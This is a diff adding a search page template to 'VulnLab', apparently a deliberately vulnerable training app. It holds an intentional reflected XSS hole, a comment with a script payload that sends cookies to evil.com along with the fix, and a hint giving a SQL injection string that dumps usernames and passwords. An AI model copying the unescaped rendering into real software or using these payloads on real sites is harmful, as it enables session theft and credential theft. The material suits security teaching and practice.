@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Search - VulnLab</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+  <a href="/">&larr; Home</a>
+  <h1>Search Comments</h1>
+  <form method="GET" action="/search">
+    <input type="text" name="q" value="{{ q }}" placeholder="search text...">
+    <button type="submit">Search</button>
+  </form>
+
+  {# [VULN-2b] Reflected XSS sink: `q` comes straight from the URL query
+     string and is echoed with `| safe`, disabling autoescaping. A link
+     like /search?q=<script>document.location='//evil.com/?c='+document.cookie</script>
+     executes attacker JS in the victim's session the moment they click it.
+     [FIX-2b] Delete `| safe` here too: <p>Results for: {{ q }}</p>
+     Jinja2's default autoescaping will turn `<script>` into
+     `&lt;script&gt;`, rendering it inert as text instead of markup. #}
+  <p>Results for: {{ q | safe }}</p>
+
+  {% for r in results %}
+    <div class="result"><strong>{{ r["username"] }}:</strong> {{ r["body"] }}</div>
+  {% else %}
+    <p>No results.</p>
+  {% endfor %}
+
+  <p class="hint">Lab hint: the query is built via string concatenation
+    server-side too — try <code>?q=x' UNION SELECT username,password FROM users--</code>.</p>
+</body>
+</html>
